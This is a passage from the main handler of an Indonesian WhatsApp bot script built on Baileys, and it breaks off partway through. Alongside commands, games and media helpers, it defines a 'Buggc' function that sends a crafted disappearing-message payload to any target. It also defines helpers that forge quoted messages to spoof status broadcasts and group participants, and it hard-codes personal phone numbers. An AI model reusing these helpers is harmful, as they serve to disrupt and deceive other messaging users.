// SC NYA JANGAN DI JUAL NGENTOD
//MAKASIH DAH PAKE 
//   -    y    -    \\
//--Recode By Fino--\\
//Error? wa.me/6288210864298
// 25 Agustus
//--- mod ---\\
const
	{
		WAConection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL, // <----->
		RehexaectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const { BBCNews, metroNews,CNNNews,iNews,KumparanNews,TribunNews,DailyNews,DetikNews,OkezoneNews, CNBCNews, FajarNews,KompasNews,SindoNews,TempoNews,IndozoneNews,AntaraNews,RepublikaNews,VivaNews, KontanNews,MerdekaNews,KomikuSearch, AniPlanetSearch, KomikFoxSearch,KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch,KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps,Mangatoon, WAModsSearch, Emojis,CoronaInfo,  Cerpen, Quotes, Couples,JalanTikusMeme, Darkjokes } = require("dhn-api");
const { uploadImage, uptotele, uptonaufal, uploadFile } = require('./lib/uploadimage.js');
const { webp2mp4File } = require('./lib/webp2mp4')
const { upImages } = require('./lib/uploadImg')
const simple = require("./lib/simple.js")
const insta = require("./lib/instagram.js");
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const delay = require('delay')
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const hx = require('hxz-api');
const tod = require('tod-api');
const ra = require('ra-api');
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imgbb = require('imgbb-uploader')
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { setppig, block, unblock, komen, login, logout, follow, upinstastory, unfollow, likepost, unlikepost } = require("./lib/instagram.js");
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const truth = JSON.parse(fs.readFileSync('./lib/truth.json'))
const dare = JSON.parse(fs.readFileSync('./lib/dare.json'))
const antilink = JSON.parse(fs.readFileSync('./lib/antilink.json'))
const setiker = JSON.parse(fs.readFileSync('./lib/stik.json'))
const imagenye = JSON.parse(fs.readFileSync('./lib/img.json'))
const audionye = JSON.parse(fs.readFileSync('./lib/vn.json'))
const { fbdl } = require("./lib/fbdl");
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const { lirikLagu } = require('./lib/lirik.js')
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { pinterest } = require('./lib/pinterest')
const scommand = JSON.parse(fs.readFileSync("./lib/scommand.json"));
const _registered = JSON.parse(fs.readFileSync('./lib/registred.json'));
const mute = JSON.parse(fs.readFileSync('./lib/mute.json'))
const antihidetg = JSON.parse(fs.readFileSync("./lib/antihidetag.json"));
const kickarea = JSON.parse(fs.readFileSync("./lib/antibule.json"));
const antivo = JSON.parse(fs.readFileSync("./lib/antivo.json"));
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n'
            + 'FN:Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺\n' 
            + 'ORG:菲諾·朱利安·安加拉\n'
            + 'TEL;type=CELL;type=VOICE;waid=6288210864298:+6288210864298\n'
            + 'END:VCARD' 
const vcard2 = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n'
            + 'FN:Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺\n' 
            + 'ORG:菲諾·朱利安·安加拉\n'
            + 'TEL;type=CELL;type=VOICE;waid=50587753432:+50587753432\n'
            + 'END:VCARD' 
            
            //Pisah
banChats = true
offline = false,
targetpc = '6288210964298','6287894440175',
ownerNumber = '6288210864298','50587753432'
fake = '🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n菲諾·朱利安·安加拉'
numbernye = '0',
nick2 = '𝙭ȿͥt͢arͫs𠒎𠐓𠐔'
cecan = fs.readFileSync('./lib/image/cecan.jpeg'),
heker = fs.readFileSync('./lib/image/fino.jpeg'),
waktu = '-',
alasan = '-',
sims = '⛃⃝🔖',
github = 'https://github.com/Finox999',
namabot = 'Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺',
lolkey = 'ZeroTeam',
lolkey2 = 'KopiLuwak',
farhan = 'antiseleb',
nama = `𝑖𝑎𝑚 𝑓𝑖𝑛𝑜 菲诺`,
nama2 = `Fino Julyan Anggara`,
NamaOwner = `agung`,
NamaBot = `tes`,
baterai = { 
    baterai: 0,
    cas: false
}
//=================================================//
const getRegisteredRandomId = () => {
  return _registered[Math.floor(Math.random() * _registered.length)].id
}
// Sticker Cmd
let _scommand = JSON.parse(fs.readFileSync("./lib/scommand.json"));

const addCmd = (id, command) => {
			const obj = { id: id, chats: command }
			scommand.push(obj)
			fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
			}
			
			const getCommandPosition = (id) => {
			let position = null
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			position = i }
			})
			
			if (position !== null) {
			return position }
			}
			
			const getCmd = (id) => {
			let position = null
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			position = i }
			})
			
			if (position !== null) {
			return scommand[position].chats }
			}
			const checkSCommand = (id) => {
			let status = false
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			status = true }
			})
			return status
			}

function addMetadata(packname, author) {
				if (!packname) packname = 'p'; if (!author) author = ' p';
				author = author.replace(/[^a-zA-Z0-9]/g, '');
				let name = `${author}_${packname}`

				if (fs.existsSync(`./lib/stickers/${name}.exif`)) {
					return `./lib/stickers/${name}.exif`
				}
				const json = {
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}

				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

				let len = JSON.stringify(json).length
				let last

				if (len > 256) {
					len = len - 256
					bytes.unshift(0x01)
				} else {
					bytes.unshift(0x00)
				}

				if (len < 16) {
					last = len.toString(16)
					last = "0" + len
				} else {
					last = len.toString(16)
				}

				const buf2 = Buffer.from(last, "hex")
				const buf3 = Buffer.from(bytes)
				const buf4 = Buffer.from(JSON.stringify(json))

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

				fs.writeFile(`./lib/stickers/${name}.exif`, buffer, (err) => {
					return `./lib/stickers/${name}.exif`
				}
			)
		}

module.exports = hexa = async (hexa, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
//*Promote & demote detect*//

		//Batre
hexa.on('CB:action,,battery', json => {
	const a = json[2][0][1].value
	const b = json[2][0][1].live
	baterai.baterai = a
	baterai.cas = b
})

	//Function waktu,tanggal
var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var thexal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilThexa = "" + hari + ", " + thexal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Jam : " + jam + ":" + menit + ":" + detik + " Wib";
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')
//Time
if(time < "23:59:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                        }
if(time < "19:00:00"){
var ucapanWaktu = 'Selamat Petang Kak'
                                         }
if(time < "18:00:00"){
var ucapanWaktu = 'Selamat Sore Kak'
                                         }
if(time < "15:00:00"){
var ucapanWaktu = 'Selamat Siang Kak'
                                         }
if(time < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi Kak'
                                         }
if(time < "05:00:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                         }
   //WAKTU BUAT FAKEREPLY
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛`; break;
            }
            var YahahaHayyuk = "" + waktoonyabro;
//Selesai     
//New game 
const slot1 = ['🍋','🍐','🍓','🍇','🍒']
            const slot2 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot3 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot4 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot5 = ['🍋','🍐','🍓','🍇','🍒']
            const slot6 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot7 = ['🍋','🍐','🍓','🍇','🍒']
            const slot8 = ['🍋','🍐','🍓','🍇','🍒']   
            const slot9 = ['🍋','🍐','🍓','🍇','🍒']
            const notc = ['😊','😃','😗','🙂','😶','😣','🙁','😞','😬']
            const oxo1 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const oxo2 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']  
            const oxo3 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const hexa1 = ['1','2','3','4','5','6','7','8','9']
            const hexa2 = ['1','2','3','4','5','6','7','8','9']
            const hexa3 = hexa1[Math.floor(Math.random() * (hexa1.length))]
            const hexa4 = hexa2[Math.floor(Math.random() * (hexa2.length))] 
            const oxo11 = oxo1[Math.floor(Math.random() * (oxo1.length))]
            const notc1 = notc[Math.floor(Math.random() * (notc.length))]
            const oxo22 = oxo2[Math.floor(Math.random() * (oxo2.length))]
            const oxo33 = oxo3[Math.floor(Math.random() * (oxo3.length))]
            const slot11 = slot1[Math.floor(Math.random() * (slot1.length))]
		    const slot22 = slot2[Math.floor(Math.random() * (slot2.length))]
		    const slot33 = slot3[Math.floor(Math.random() * (slot3.length))]
		    const slot44 = slot4[Math.floor(Math.random() * (slot4.length))]
			const slot55 = slot5[Math.floor(Math.random() * (slot5.length))]
			const slot66 = slot6[Math.floor(Math.random() * (slot6.length))]	
		    const slot77 = slot4[Math.floor(Math.random() * (slot7.length))]
		    const slot88 = slot5[Math.floor(Math.random() * (slot8.length))]
			const slot99 = slot6[Math.floor(Math.random() * (slot9.length))]
				                       //end\\
                const type = Object.keys(mek.message)[0]        
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		

			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
      const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
			const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
	const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = hexa.user.jid
		const botNumberss = hexa.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
const m = simple.smsg(hexa, mek);
const isAntilink = isGroup ? antilink.includes(from) : false;
const Buggc = async(target, teks) => {
           if (!teks) teks = '.'
           await hexa.relayWAMessage(hexa.
           prepareMessageFromContent(target, hexa.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:true})
           hexa.sendMessage(target, teks, 'conversation')
}
  const isMuted = isGroup ? mute.includes(from) : false
  const isOwner = ownerNumber.includes(sender)
		// const isSelfNumber = config.NomorSELF
const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
		const totalchat = await hexa.chats.all()
		const groupMetadata = isGroup ? await hexa.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
  const stickCmd = type == 'stickerMessage' ? mek.message.stickerMessage.fileSha256.toString('base64') : '' || ''
  const isAntiLink = isGroup ? antilink.includes(from) : false
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
const id = '6288210864298d@s.whatsapp.net'
const hariRaya = new Date('mei 3, 2022 07:00:00')
const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
       var ase = new Date();
      var waktoo = ase.getHours();
      const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = hexa.user.phone
      var tampilHari = "" + waktoo;
        const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'
//igdl
const downloadM = async(save) => {
      encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
      encmediaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
      encmediaa = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
      encmediaa = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
      encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
      if (save) return await hexa.downloadAndSaveMediaMessage(encmediaa)
      return await hexa.downloadMediaMessage(encmediaa)
    }

        //MESS
		mess = {
			wait: '𝙾𝚃𝚆 𝚃𝚄𝙽𝙶𝚄 𝙱𝙽𝚃𝚁',
			success: '𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻',
			wrongFormat: '𝙵𝙾𝚁𝙼𝙰𝚃 𝚂𝙰𝙻𝙰𝙷',
			error: {
				stick: '𝙸𝚃𝚄 𝙱𝚄𝙺𝙰𝙽 𝚂𝚃𝙸𝙲𝙺𝙴 𝙰𝚂𝚄',
				Iv: '𝙻𝙸𝙽𝙺𝙽𝚈𝙰𝚂𝙰𝙻𝙰𝙷',
				ferr: 'eror!!'
			},
			only: {
				group: 'Khusus grup ngab',
				admin: 'Khusus admin bang',
				ownerB: 'ga',
				botadmin: 'Jadiin 𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺 admin',
				}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            hexa.sendMessage(from, teks, text, {quoted:mek})
        }
        const forwarding = (teks) => {
         hexa.sendMessage(from, teks, text, {quoted:mek, contextInfo: {"forwardingScore":999999,"isForwarded":true}
         })
        }
const forwarding2 = (teks) => {
         hexa.sendMessage(from, teks, text, {quoted:ftroli, contextInfo: {"forwardingScore":999999,"isForwarded":true}
         })
        }
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      hexa.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
const textImg = (teks) => {
           return hexa.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./lib/image/fino.jpeg')})
        }
        const sendMess = (hehe, teks) => {
            hexa.sendMessage(hehe, teks, text)
        }
const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? hexa.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hexa.sendMessage(from, teks.trim(), extendedText, { quoted: ftroli, contextInfo: { "mentionedJid": memberr } })
        }
 sendImageCaption = (from, image, mek, caption) => {
  return hexa.sendMessage(from, image, MessageType.image, { quoted: fvideo, caption: caption, thumbnail: heker });
};

const sendButLoc = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await hexa.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
hexa.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
        const fakestatus = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./lib/image/fino.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            hexa.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./lib/image/cecan.jpeg'),quoted:ftroli,caption:yes})
        }
       const sendButLocation = (id, text1, desc1, but = [], options = {}) => {
       tes = hexa.prepareMessage(from,  {degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: fs.readFileSync(`./lib/image/cecan.jpeg`)}, location)
        const buttonMessage = {
         locationMessage: tes.message.locationMessage,
          contentText: text1,
          footerText: desc1,
          buttons: but,
          headerType: 6,
        };
        hexa.sendMessage(
          id,
          buttonMessage,
          MessageType.buttonsMessage,
          options
        );
      };
        const fakegroup = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
